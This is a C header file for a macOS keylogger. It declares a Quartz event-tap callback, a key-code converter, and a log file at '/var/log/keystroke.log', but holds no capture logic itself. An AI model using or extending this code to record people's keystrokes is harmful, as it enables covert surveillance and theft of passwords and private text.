#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <sys/types.h>
#include <sys/time.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include "utils.h"
#include "keys.h"

FILE *logfile = NULL;
const char *logfileLocation = "/var/log/keystroke.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int, bool, bool);

#endif